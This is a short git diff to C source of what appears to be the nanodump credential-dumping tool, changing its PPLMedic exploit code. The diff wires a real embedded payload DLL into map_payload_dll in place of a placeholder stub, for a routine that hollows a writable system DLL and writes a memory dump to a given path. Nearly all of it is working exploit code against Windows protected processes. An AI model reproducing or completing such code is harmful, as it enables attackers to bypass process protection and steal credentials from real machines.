@@ -1,6 +1,10 @@
 #include "ppl/ppl_medic.h"
 #include "ppl/ppl_utils.h"
-#include "ppl/medic_client.h"
+#include "ppl/ppl_medic_client.h"
+
+#ifdef EXE
+ #include "nanodump_ppl_medic_dll.x64.h"
+#endif
 
 BOOL run_ppl_medic_exploit(
     IN LPCSTR dump_path,
@@ -338,7 +342,7 @@ BOOL enumerate_temporary_directories(
         file_list          = current_file;
 
         swprintf_s(current_file->FileName, MAX_PATH, L"%ws", FindData.cFileName);
-        DPRINT("current_file->FileName: %ls", current_file->FileName);
+        //DPRINT("current_file->FileName: %ls", current_file->FileName);
 
     } while (FindNextFileW(hFind, &FindData));
 
@@ -703,10 +707,8 @@ BOOL map_payload_dll(
     }
 
     // TODO: add dinvoke
-    // TODO: implement DLL
-    char test_dll[] = { "MZ\xc3\xc3\xc3" };
-    pDllData = test_dll;
-    dwDllSize = sizeof(test_dll);
+    pDllData  = nanodump_ppl_medic_dll;
+    dwDllSize = nanodump_ppl_medic_dll_len;
 
     success = find_writable_system_dll(dwDllSize, HollowedDllPath);
     if (!success)
